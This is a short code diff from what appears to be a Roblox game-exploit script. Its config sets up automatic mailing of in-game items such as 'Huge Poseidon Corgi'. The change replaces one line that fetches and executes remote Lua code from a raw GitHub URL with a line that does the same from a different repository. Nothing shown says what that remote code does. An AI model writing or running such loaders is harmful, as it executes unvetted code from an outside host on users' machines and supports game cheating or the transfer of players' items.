@@ -26,7 +26,7 @@ getgenv().config = {
     manualMailItem = "1",             -- "Magic Shards" // "Huge Poseidon Corgi"
     manualMailAmount = 0,              -- amount to manually mail
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CHICHazHUB/Semaguteb/main/aaa"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CHICHazHUB/kfdsh/main/nn"))()
 end)
 task.spawn(function()
     task.wait(5)
